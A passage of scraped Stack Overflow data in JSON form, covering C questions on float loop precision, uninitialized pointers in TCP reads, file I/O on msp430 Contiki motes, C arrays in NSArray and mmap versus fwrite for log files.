"Duplicate", "title": "Loop cannot reach the limit", "body": "<p>I want to understand why this <code>for</code> doesn't stop its execution to 10. See the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n  float i;\n  for (i = 0.0; i &lt;= 10; i += 0.01)\n    printf(\"Iteration %g\\n\", i);\n\n  return 0;\n}\n</code></pre>\n\n<p>The latest iterations are:</p>\n\n<blockquote>\n  <p>Iteration 9.96013<br>\n  Iteration 9.97013<br>\n  Iteration 9.98013<br>\n  Iteration 9.99013</p>\n</blockquote>\n\n<p>Why this behaviour ?</p>\n"}, {"tags": ["c++", "c", "pointers", "buffer"], "comments": [{"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 4, "creation_date": 1457527105, "post_id": 35891823, "comment_id": 59444444, "body": "Undefined behavour here&quot; <code>*buf = 0;</code>. Your pointer doesn&#39;t point to any place that can be de-referenced."}, {"owner": {"reputation": 39990, "user_id": 5528593, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/7JPcT.png?s=128&g=1", "display_name": "Ren&#233; Vogt", "link": "https://stackoverflow.com/users/5528593/ren%c3%a9-vogt"}, "edited": false, "score": 0, "creation_date": 1457527333, "post_id": 35891823, "comment_id": 59444618, "body": "<code>buf += readBytes</code> is moving the pointer at the end of the read bytes. probably to let the next call to <code>tcpSocket-&gt;read</code> start writing after the already read bytes. But as juanchopanza said, in the code shown <code>buf</code> was never initialized anyway. And of course you would have to save the orginial start pointer somewhere if you want to use it later."}, {"owner": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "edited": false, "score": 1, "creation_date": 1457527336, "post_id": 35891823, "comment_id": 59444622, "body": "You need to point <code>buf</code> to the actual buffer. Something like <code>char data[10]; char* buf = data;</code>."}, {"owner": {"reputation": 11, "user_id": 6039374, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7462401d41e802867904c9f438f23fc2?s=128&d=identicon&r=PG&f=1", "display_name": "ThW", "link": "https://stackoverflow.com/users/6039374/thw"}, "edited": false, "score": 0, "creation_date": 1457528010, "post_id": 35891823, "comment_id": 59445109, "body": "Thanks for the answers, this is helping me very much."}], "answers": [{"comments": [{"owner": {"reputation": 27385, "user_id": 1382251, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/17622c39e8ead537a0944c767551b2fe?s=128&d=identicon&r=PG", "display_name": "barak manos", "link": "https://stackoverflow.com/users/1382251/barak-manos"}, "edited": false, "score": 0, "creation_date": 1457527314, "post_id": 35891891, "comment_id": 59444603, "body": "You need to state something better than &quot;line 2 won&#39;t work&quot;. It could work, it could fail, it could generate a segmentation fault, and in general it could do many things."}], "tags": [], "owner": {"reputation": 2678, "user_id": 3387223, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/370iy.png?s=128&g=1", "display_name": "CodeMonkey", "link": "https://stackoverflow.com/users/3387223/codemonkey"}, "is_accepted": false, "score": 0, "last_activity_date": 1457527392, "last_edit_date": 1457527392, "creation_date": 1457527244, "answer_id": 35891891, "question_id": 35891823, "link": "https://stackoverflow.com/questions/35891823/pointer-of-array-integer-c/35891891#35891891", "title": "Pointer of Array + Integer (C++)", "body": "<p>Line 4 advances the pointer by the bytes you read, so that e.g. on the next call you don't overwrite your previous data.</p>\n\n<p>As is stated in the comments line 2 is undefined behavior, because you didn't set your buf pointer to allocated memory.</p>\n"}, {"comments": [{"owner": {"reputation": 11, "user_id": 6039374, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7462401d41e802867904c9f438f23fc2?s=128&d=identicon&r=PG&f=1", "display_name": "ThW", "link": "https://stackoverflow.com/users/6039374/thw"}, "edited": false, "score": 0, "creation_date": 1457527874, "post_id": 35891955, "comment_id": 59445014, "body": "Thanks for the anser, pointer shifting makes sense. But if the pointer is once at the end, and then the function is returned, is the pointer at the calling function then at the beginning? Or still at the end? Because I find nothing for moving the pointer to the beginning again."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 11, "user_id": 6039374, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7462401d41e802867904c9f438f23fc2?s=128&d=identicon&r=PG&f=1", "display_name": "ThW", "link": "https://stackoverflow.com/users/6039374/thw"}, "edited": false, "score": 0, "creation_date": 1457528064, "post_id": 35891955, "comment_id": 59445150, "body": "@ThW The pointer is passed by value, which means the function gets a copy. Modifying a copy will not modify the original, so the pointer you use when you call the function will not be modified, and will still point to the beginning of the buffer."}, {"owner": {"reputation": 11, "user_id": 6039374, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7462401d41e802867904c9f438f23fc2?s=128&d=identicon&r=PG&f=1", "display_name": "ThW", "link": "https://stackoverflow.com/users/6039374/thw"}, "edited": false, "score": 0, "creation_date": 1457528199, "post_id": 35891955, "comment_id": 59445254, "body": "Great, thanks for all the quick answers. This solves my problem! THANK YOU ALL!"}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 2, "last_activity_date": 1457527883, "last_edit_date": 1457527883, "creation_date": 1457527449, "answer_id": 35891955, "question_id": 35891823, "link": "https://stackoverflow.com/questions/35891823/pointer-of-array-integer-c/35891955#35891955", "title": "Pointer of Array + Integer (C++)", "body": "<p>TCP is a <em>streaming</em> protocol, that means there are no message boundaries in the data you receive. Therefore one might not get all the data one asks for in a single receive call, but have to loop and and read multiple times.</p>\n\n<p>By doing e.g. <code>buf += readBytes</code> you advance the pointer <code>buf</code> by <code>readBytes</code> elements, so next time you receive the data will be written where the last receive call left of.</p>\n\n<p>There are some things that you need to fix through, besides you using and dereferencing an uninitialized pointer, and that is that you can't read a fixed number of bytes every iteration in the loop, you need to decrease the amount of data to receive by <code>readBytes</code> as well. You also need to exit the loop once you read all the data.</p>\n\n<p>Lets put all this together into a nice function which will always read the requested amount of data, as an example:</p>\n\n<pre><code>// tcpSocket is the socket to receive data from (I don't know the actual type)\n// buffer is the destination buffer, where the received data should be written\n// len is the number of bytes to receive\n// Pre-condition: buffer must point to memory of at least len bytes\nbool read_data(TCPSocketType* tcpSocket, char* buffer, size_t len)\n{\n    // Loop while there are still bytes to read\n    while (len &gt; 0)\n    {\n        ssize_t readBytes = tcpSocket-&gt;read(buffer, len);\n        if (readBytes &lt;= 0)\n        {\n            // There was an error (readBytes &lt; 0)\n            // Or the connection was closed (readBytes == 0)\n            return false;\n        }\n\n        buffer += readBytes;  // Next position to write data into\n        len -= readBytes;  // We don't need to read as much now\n    }\n\n    return true;  // Now we have read all of the data\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 6039374, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7462401d41e802867904c9f438f23fc2?s=128&d=identicon&r=PG&f=1", "display_name": "ThW", "link": "https://stackoverflow.com/users/6039374/thw"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 81, "favorite_count": 0, "answer_count": 2, "score": -3, "last_activity_date": 1457527883, "creation_date": 1457527053, "last_edit_date": 1457527122, "question_id": 35891823, "link": "https://stackoverflow.com/questions/35891823/pointer-of-array-integer-c", "title": "Pointer of Array + Integer (C++)", "body": "<p>I am not so familar with C++, so I want to ask, what the following code will do (I have it in an existing C++ project):</p>\n\n<pre><code>1: char* buf;\n2: *buf = 0;\n3: int readBytes = tcpSocket-&gt;read(buf, 10);\n4: buf += readBytes;\n</code></pre>\n\n<p>Explanation is very simple, from a TCP Socket should be read 10 bytes and the read bytes are stored in the char* Buffer \"buf\".\nThe return value is the number of read bytes.</p>\n\n<p>But why I need line 4?\nOr better what is line 4 doing?\nIn my understanding it is destroying my \"buf\" result, isn't it?</p>\n\n<p>I hope someone can help me, and maybe explaining me, why I need this line 4.</p>\n\n<p>BR\nThW</p>\n"}, {"tags": ["c", "msp430", "contiki"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457527868, "post_id": 35891725, "comment_id": 59445012, "body": "Did you <code>#include &lt;stdio.h&gt;</code>?"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457529686, "post_id": 35891725, "comment_id": 59446302, "body": "Is your development SDK well installed?"}, {"owner": {"reputation": 695, "user_id": 4845068, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/TFn8B.jpg?s=128&g=1", "display_name": "Ahmed Al-haddad", "link": "https://stackoverflow.com/users/4845068/ahmed-al-haddad"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457530346, "post_id": 35891725, "comment_id": 59446798, "body": "I am using <a href=\"http://zolertia.sourceforge.net/wiki/index.php/Mainpage:Contiki\" rel=\"nofollow noreferrer\">contiki</a> that through it I can upload the program to the z1 motes. I am not sure about the SDK but supposedly it comes ready, and this is the first time I face such problem with it. @LPs"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 1, "creation_date": 1457530777, "post_id": 35891725, "comment_id": 59447110, "body": "Have you got other includes before the stdio one? Post the whole file, if possible."}, {"owner": {"reputation": 695, "user_id": 4845068, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/TFn8B.jpg?s=128&g=1", "display_name": "Ahmed Al-haddad", "link": "https://stackoverflow.com/users/4845068/ahmed-al-haddad"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457530958, "post_id": 35891725, "comment_id": 59447238, "body": "Oh, I have many of them actually. I will include them in the question."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457531036, "post_id": 35891725, "comment_id": 59447303, "body": "Ensure that no one of those includes needs stdio.h, or simply move stdio include at the top of all includes."}, {"owner": {"reputation": 695, "user_id": 4845068, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/TFn8B.jpg?s=128&g=1", "display_name": "Ahmed Al-haddad", "link": "https://stackoverflow.com/users/4845068/ahmed-al-haddad"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457531111, "post_id": 35891725, "comment_id": 59447372, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/105812/discussion-between-ahmed-al-haddad-and-lps\">continue this discussion in chat</a>."}], "answers": [{"comments": [{"owner": {"reputation": 695, "user_id": 4845068, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/TFn8B.jpg?s=128&g=1", "display_name": "Ahmed Al-haddad", "link": "https://stackoverflow.com/users/4845068/ahmed-al-haddad"}, "edited": false, "score": 0, "creation_date": 1457680446, "post_id": 35897853, "comment_id": 59525332, "body": "Oh, makes sense then. How about alternative methods? Is there a way to store the data coming if I can only use the <code>printf</code> function?"}, {"owner": {"reputation": 6567, "user_id": 2435820, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/J6uQT.png?s=128&g=1", "display_name": "kfx", "link": "https://stackoverflow.com/users/2435820/kfx"}, "reply_to_user": {"reputation": 695, "user_id": 4845068, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/TFn8B.jpg?s=128&g=1", "display_name": "Ahmed Al-haddad", "link": "https://stackoverflow.com/users/4845068/ahmed-al-haddad"}, "edited": false, "score": 0, "creation_date": 1457715215, "post_id": 35897853, "comment_id": 59548014, "body": "You can use the <code>xmem</code> interface defined to access the flash memory directly (<code>contiki&#47;core&#47;dev&#47;xmem.h</code>). FYI, you need to erase a sector before writing in it, if you know that it&#39;s pretty simple to use."}, {"owner": {"reputation": 695, "user_id": 4845068, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/TFn8B.jpg?s=128&g=1", "display_name": "Ahmed Al-haddad", "link": "https://stackoverflow.com/users/4845068/ahmed-al-haddad"}, "edited": false, "score": 0, "creation_date": 1457722315, "post_id": 35897853, "comment_id": 59552077, "body": "Hmm, I have to admit that I have no idea how to do that. Would you please help me, or suggest a tutorial that I can follow to do this? I tried to read data from the serial port but I have been facing a lot of bugs and it is taking me a lot more than I thought!.."}, {"owner": {"reputation": 695, "user_id": 4845068, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/TFn8B.jpg?s=128&g=1", "display_name": "Ahmed Al-haddad", "link": "https://stackoverflow.com/users/4845068/ahmed-al-haddad"}, "edited": false, "score": 0, "creation_date": 1457776163, "post_id": 35897853, "comment_id": 59567742, "body": "Btw, do you mean to erase a sector of the memory and then store the data in the memory of the z1?"}], "tags": [], "owner": {"reputation": 6567, "user_id": 2435820, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/J6uQT.png?s=128&g=1", "display_name": "kfx", "link": "https://stackoverflow.com/users/2435820/kfx"}, "is_accepted": true, "score": 1, "last_activity_date": 1458296878, "last_edit_date": 1458296878, "creation_date": 1457542685, "answer_id": 35897853, "question_id": 35891725, "link": "https://stackoverflow.com/questions/35891725/c-error-unknown-type-name-file-on-zolertia-z1-motes/35897853#35897853", "title": "C - error: unknown type name \u2018FILE\u2019 on Zolertia z1 motes", "body": "<p><code>msp430</code> is a very hardware-limited platform, so the complete C standard library functionality is not supported. In particular there is no hard disk or even SD card on typical msp430 platforms, so there's also little need to have a filesystem-related routines in software.</p>\n\n<p>If you look at <code>msp430-libc</code> <a href=\"https://sourceforge.net/p/mspgcc/msp430-libc/ci/master/tree/include/stdio.h\" rel=\"nofollow\">source code</a>, you can clearly see that it only support for the <code>printf</code> function family.</p>\n\n<p>It's possible to use the <code>xmem</code> interface to store data on the onboard flash. The interface is defined in <code>contiki/core/dev/xmem.h</code>. Using it is simple: first erase a whole sector, then you can write in that sector. Call <code>xmem_erase</code> with a flash address as an argument (any address in the sector you want to erase), then call <code>xmem_write</code> passing a buffer which to write and a flash address (start offset) where write to. Flash addresses typically start from zero.</p>\n\n<p>It's also possible to use the Coffee, Contiki file system.</p>\n"}, {"tags": [], "owner": {"reputation": 131, "user_id": 5597244, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-hMhRRQGpyC0/AAAAAAAAAAI/AAAAAAAAABQ/keCGY3lqFms/photo.jpg?sz=128", "display_name": "Antonio Lignan", "link": "https://stackoverflow.com/users/5597244/antonio-lignan"}, "is_accepted": false, "score": 1, "last_activity_date": 1458656177, "creation_date": 1458656177, "answer_id": 36156847, "question_id": 35891725, "link": "https://stackoverflow.com/questions/35891725/c-error-unknown-type-name-file-on-zolertia-z1-motes/36156847#36156847", "title": "C - error: unknown type name \u2018FILE\u2019 on Zolertia z1 motes", "body": "<p>Contiki provides a library called <code>CFS (Coffee flash system)</code> to abstract the flash memory and write/read in a file-like way, there's a guide in the <a href=\"https://github.com/contiki-os/contiki/wiki/File-systems\" rel=\"nofollow\">Contiki's wiki page</a></p>\n\n<p>The Zolertia Z1 supports CFS.</p>\n"}], "owner": {"reputation": 695, "user_id": 4845068, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/TFn8B.jpg?s=128&g=1", "display_name": "Ahmed Al-haddad", "link": "https://stackoverflow.com/users/4845068/ahmed-al-haddad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 530, "favorite_count": 0, "accepted_answer_id": 35897853, "answer_count": 2, "score": -1, "last_activity_date": 1458656177, "creation_date": 1457526812, "last_edit_date": 1457542803, "question_id": 35891725, "link": "https://stackoverflow.com/questions/35891725/c-error-unknown-type-name-file-on-zolertia-z1-motes", "title": "C - error: unknown type name \u2018FILE\u2019 on Zolertia z1 motes", "body": "<p>My z1 mote acts as the base station and it is connected directly to the gateway (pc). I wanted to save the data coming on a text file using this code in the unicast-receiver.c:</p>\n\n<pre><code>//after printing on the screen then store\nFILE *f = fopen(\"clients.txt\", \"wb\");\nfwrite(data, sizeof(char), sizeof(data), f);\nfclose(f); \n</code></pre>\n\n<p>but I am getting this error: </p>\n\n<pre><code>unicast-receiver.c: In function \u2018receiver\u2019:\nunicast-receiver.c:49:1: error: unknown type name \u2018FILE\u2019\n</code></pre>\n\n<p>Eventhough stdio.h is included. Anyone faced the same kind of error before? How do I fix it? If there's no way to do this through z1 motes, then is any other way to store the data? </p>\n\n<p>Here are the includes in the program</p>\n\n<pre><code>#include \"contiki.h\"\n#include \"lib/random.h\"\n#include \"sys/ctimer.h\"\n#include \"sys/etimer.h\"\n#include \"net/ip/uip.h\"\n#include \"net/ipv6/uip-ds6.h\"\n#include \"net/ip/uip-debug.h\"\n\n#include \"simple-udp.h\"\n#include \"servreg-hack.h\"\n\n#include \"net/rpl/rpl.h\"\n\n#include \"dev/cc2420/cc2420.h\"\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n</code></pre>\n"}, {"tags": ["objective-c", "c", "cocoa"], "answers": [{"comments": [{"owner": {"reputation": 55328, "user_id": 257022, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/e6260b6943182933dffdca8d3a4697b6?s=128&d=identicon&r=PG", "display_name": "aneuryzm", "link": "https://stackoverflow.com/users/257022/aneuryzm"}, "edited": false, "score": 0, "creation_date": 1457527020, "post_id": 35891774, "comment_id": 59444389, "body": "Is there an inline notation so that I don&#39;t need to declare the variable someCarray?"}, {"owner": {"reputation": 25326, "user_id": 356292, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/eba34d6d8a4fde0b97505cad1ab37316?s=128&d=identicon&r=PG", "display_name": "Eiko", "link": "https://stackoverflow.com/users/356292/eiko"}, "reply_to_user": {"reputation": 55328, "user_id": 257022, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/e6260b6943182933dffdca8d3a4697b6?s=128&d=identicon&r=PG", "display_name": "aneuryzm", "link": "https://stackoverflow.com/users/257022/aneuryzm"}, "edited": false, "score": 1, "creation_date": 1457529835, "post_id": 35891774, "comment_id": 59446416, "body": "@Patrick Where does the array come from, then? Some code must create it (and allocate its memory) - you certainly don&#39;t want to store a pointer to a short-lived slice of stack memory. And if you&#39;re just creating it, the question is, why use a C array here?"}, {"owner": {"reputation": 25326, "user_id": 356292, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/eba34d6d8a4fde0b97505cad1ab37316?s=128&d=identicon&r=PG", "display_name": "Eiko", "link": "https://stackoverflow.com/users/356292/eiko"}, "reply_to_user": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "edited": false, "score": 1, "creation_date": 1457529908, "post_id": 35891774, "comment_id": 59446486, "body": "@dasblinkenlight Indeed bad wording on my part. Will edit the answer."}], "tags": [], "owner": {"reputation": 25326, "user_id": 356292, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/eba34d6d8a4fde0b97505cad1ab37316?s=128&d=identicon&r=PG", "display_name": "Eiko", "link": "https://stackoverflow.com/users/356292/eiko"}, "is_accepted": true, "score": 4, "last_activity_date": 1457530304, "last_edit_date": 1457530304, "creation_date": 1457526933, "answer_id": 35891774, "question_id": 35891660, "link": "https://stackoverflow.com/questions/35891660/can-i-add-a-c-array-into-a-objective-c-nsarray/35891774#35891774", "title": "Can I add a C array into a objective-C NSArray?", "body": "<p>You cannot add plain C arrays to <code>NSArray</code>.</p>\n\n<p>But as storing a C array means storing a pointer, you can wrap that pointer into an <code>NSValue</code> and store that instead:</p>\n\n<pre><code>char *someCArray = ...;\nNSArray *array = @[[NSValue valueWithPointer:someCArrray]];\n</code></pre>\n\n<p>Keep in mind that you are only storing the pointer - and memory management is still up to you.</p>\n\n<p>Or you could wrap the memory of the array into some Objective-C object, like  <code>NSData</code>, but there should be very good reasons to go to such lengths. </p>\n\n<p>My guess in the wild is - without knowing the concrete use case - that you're better of converting the C data into objects themselves and store them \"the Objective-C\" way.</p>\n"}], "owner": {"reputation": 55328, "user_id": 257022, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/e6260b6943182933dffdca8d3a4697b6?s=128&d=identicon&r=PG", "display_name": "aneuryzm", "link": "https://stackoverflow.com/users/257022/aneuryzm"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 258, "favorite_count": 0, "accepted_answer_id": 35891774, "answer_count": 1, "score": 4, "last_activity_date": 1457530304, "creation_date": 1457526613, "question_id": 35891660, "link": "https://stackoverflow.com/questions/35891660/can-i-add-a-c-array-into-a-objective-c-nsarray", "title": "Can I add a C array into a objective-C NSArray?", "body": "<p>Can I add a C array into a objective-C NSArray?</p>\n\n<pre><code>NSArray * testArray = [NSArray arrayWithObjects:\n         @\"obj1\", \n         {\"C array obj1\", \"C array obj2\"},\n          nil];\n</code></pre>\n\n<p>gives me <code>Expected Expression</code> message error.</p>\n"}, {"tags": ["c++", "c", "linux", "mmap"], "answers": [{"comments": [{"owner": {"reputation": 7645, "user_id": 2692339, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4f8e4e5cba3b6606d8e395364c1742b8?s=128&d=identicon&r=PG&f=1", "display_name": "edmz", "link": "https://stackoverflow.com/users/2692339/edmz"}, "edited": false, "score": 0, "creation_date": 1457529191, "post_id": 35891885, "comment_id": 59445965, "body": "<code>mmap</code> indeed has no intermediate buffer and writes data directly as requested (same for <code>write</code> and friends), thing user space APIs generally avoid. This also allows fewer system calls, which are expensive to make."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1457529762, "post_id": 35891885, "comment_id": 59446348, "body": "Can you provide benchmark data for <code>mmap</code> vs <code>fwrite</code>, along with <code>write</code>?"}, {"owner": {"reputation": 8716, "user_id": 2938364, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/vNRRo.jpg?s=128&g=1", "display_name": "Markus Weninger", "link": "https://stackoverflow.com/users/2938364/markus-weninger"}, "edited": false, "score": 1, "creation_date": 1457530014, "post_id": 35891885, "comment_id": 59446564, "body": "I only compared <code>mmap</code> to <code>fwrite</code>, with further parameters like parallelization and side load, yet the thesis is currently not completely finnished and published, so I&#39;m not sure if I&#39;m allowed to publish the results at the moment."}, {"owner": {"reputation": 1469, "user_id": 2397118, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/7241c07b5e6a92c24c2e3e2af011153b?s=128&d=identicon&r=PG", "display_name": "Swiss Frank", "link": "https://stackoverflow.com/users/2397118/swiss-frank"}, "edited": false, "score": 0, "creation_date": 1571637696, "post_id": 35891885, "comment_id": 103292966, "body": "Markus some time has gone by.  Are you now allowed to share your results?  Specifically I&#39;m curious HOW fwrite is faster.  WHY mmap is slower.  My only guess is that I&#39;ve never used msync().  I just mmap(), write data, munmap(), and the data appears on disk in its own good time.  Is fwrite() faster only by also not doing an msync() or similar?"}, {"owner": {"reputation": 61429, "user_id": 572743, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/9941673f566f229bc536c1c2b558884e?s=128&d=identicon&r=PG&f=1", "display_name": "Damon", "link": "https://stackoverflow.com/users/572743/damon"}, "edited": false, "score": 0, "creation_date": 1578828912, "post_id": 35891885, "comment_id": 105559540, "body": "There may be other reasons than just IO speed for using mmap. For example, if your (possibly multithreaded) program crashes while in mid-writeout, log messages are lost. If OOM kills your process, log messages are lost. If you forgot to use append-only, the whole file is possibly garbled. Plus, you must sync. With memory mapping, you do not need to worry (the many syncs in your example are not needed). You have &quot;some memory area&quot; that you write to, and what happens after that is no longer your problem. Sure, pages may not be immediately written out, but that&#39;s fine (even desirable)."}], "tags": [], "owner": {"reputation": 8716, "user_id": 2938364, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/vNRRo.jpg?s=128&g=1", "display_name": "Markus Weninger", "link": "https://stackoverflow.com/users/2938364/markus-weninger"}, "is_accepted": true, "score": 20, "last_activity_date": 1476916397, "last_edit_date": 1476916397, "creation_date": 1457527223, "answer_id": 35891885, "question_id": 35891525, "link": "https://stackoverflow.com/questions/35891525/mmap-for-writing-sequential-log-file-for-speed/35891885#35891885", "title": "mmap for writing sequential log file for speed?", "body": "<p>I wrote my bachelor thesis about the comparism of fwrite VS mmap (<em>\"An Experiment to Measure the Performance Trade-off between Traditional I/O and Memory-mapped Files\"</em>). First of all, for writing, you don't have to go for memory-mapped files, espacially for large files. <code>fwrite</code> is totally fine and will nearly always outperform approaches using <code>mmap</code>. <code>mmap</code> will give you the most performance boosts for parallel data reading; for sequential data writing your real limitation with <code>fwrite</code> is your hardware.</p>\n\n<hr>\n\n<p>In my examples <code>remapSize</code> is the initial size of the file and the size by which the file gets increased on each remapping.\n<code>fileSize</code> keeps track of the size of the file, <code>mappedSpace</code> represents the size of the current mmap (it's length), <code>alreadyWrittenBytes</code> are the bytes that have already been written to the file.</p>\n\n<p>Here is the example initalization:</p>\n\n<pre><code>void init() {\n  fileDescriptor = open(outputPath, O_RDWR | O_CREAT | O_TRUNC, (mode_t) 0600); // Open file\n  result = ftruncate(fileDescriptor, remapSize); // Init size\n  fsync(fileDescriptor); // Flush\n  memoryMappedFile = (char*) mmap64(0, remapSize, PROT_WRITE, MAP_SHARED, fileDescriptor, 0); // Create mmap\n  fileSize = remapSize; // Store mapped size\n  mappedSpace = remapSize; // Store mapped size\n}\n</code></pre>\n\n<p><strong>Ad Q1:</strong></p>\n\n<p>I used an \"Unmap-Remap\"-mechanism.</p>\n\n<p><em>Unmap</em> </p>\n\n<ul>\n<li>first flushes (<code>msync</code>)</li>\n<li>and then unmaps the memory-mapped file. </li>\n</ul>\n\n<p>This could look the following:</p>\n\n<pre><code>void unmap() {\n  msync(memoryMappedFile, mappedSpace, MS_SYNC); // Flush\n  munmap(memoryMappedFile, mappedSpace)\n}\n</code></pre>\n\n<p>For <em>Remap</em>, you have the choice to remap the whole file or only the newly appended part.</p>\n\n<p>Remap basically</p>\n\n<ul>\n<li>increases the file size</li>\n<li>creates the new memory map</li>\n</ul>\n\n<p>Example implementation for a full remap:</p>\n\n<pre><code>void fullRemap() {\n  ftruncate(fileDescriptor, mappedSpace + remapSize); // Make file bigger\n  fsync(fileDescriptor); // Flush file\n  memoryMappedFile = (char*) mmap64(0, mappedSpace + remapSize, PROT_WRITE, MAP_SHARED, fileDescriptor, 0); // Create new mapping on the bigger file\n  fileSize += reampSize;\n  mappedSpace += remapSize; // Set mappedSpace to new size\n}\n</code></pre>\n\n<p>Example implementation for the small remap:</p>\n\n<pre><code>void smallRemap() {\n  ftruncate(fileDescriptor, fileSize + remapSize); // Make file bigger\n  fsync(fileDescriptor); // Flush file\n  remapAt = alreadyWrittenBytes % pageSize == 0 \n            ? alreadyWrittenBytes \n            : alreadyWrittenBytes - (alreadyWrittenBytes % pageSize); // Adjust remap location to pagesize\n  memoryMappedFile = (char*) mmap64(0, fileSize + remapSize - remapAt, PROT_WRITE, MAP_SHARED, fileDescriptor, remapAt); // Create memory-map\n  fileSize += remapSize;\n  mappedSpace = fileSize - remapAt;\n}\n</code></pre>\n\n<p>There is a <a href=\"http://man7.org/linux/man-pages/man2/mremap.2.html\" 